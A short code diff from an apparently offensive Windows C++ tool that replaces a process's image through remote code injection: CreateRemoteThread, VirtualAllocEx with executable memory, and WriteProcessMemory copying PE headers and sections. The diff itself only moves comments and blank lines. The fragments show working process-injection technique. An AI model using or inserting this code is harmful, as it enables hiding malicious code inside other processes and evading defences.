@@ -45,7 +45,6 @@ bool Override::ReplaceImage(const wchar_t* proc, const wchar_t* newImagePath, bo
 		return true;
 	}
 
-
 	// Remote code injection
 	std::puts("[+] Injecting using CreateRemoteThread technique [+]");
 	RemoteBuffer threadArg(hProc);
@@ -91,15 +90,15 @@ LPVOID Override::ReplaceImage(HANDLE hProc, const File& target, BasicPE& pe)
 		imgMem = VirtualAllocEx(hProc, NULL, pe.pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 		if (!imgMem) {
+			// Ok, something really bad is happening now!
+
 			std::puts("[-] Error on allocating PE memory [-]\n");
 			return nullptr;
 		}
 		std::printf("[+] Allocated PE memory at base address 0x%llx\n", (ULONG_PTR)imgMem);
-		// Ok, something really bad is happening now!
 	}
 
 	std::printf("[+] Allocated memory at 0x%llx [+]\n[+] Copying PE header... [+]\n\n\n", (ULONG_PTR) imgMem);
-	// Get first section entry
 
 	// Write all header info
 	if (!WriteProcessMemory(hProc, imgMem, target.data, pe.pNtHeader->OptionalHeader.SizeOfHeaders, NULL))
@@ -111,7 +110,10 @@ LPVOID Override::ReplaceImage(HANDLE hProc, const File& target, BasicPE& pe)
 
 
 	std::printf("[+] Writing sections! [+]\n\n");
+
+	// Get first section entry
 	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pe.pNtHeader);
+
 	// Write sections
 	for (auto i = 0; i < pe.pFileHeader->NumberOfSections; ++i, ++pSectionHeader)
 	{
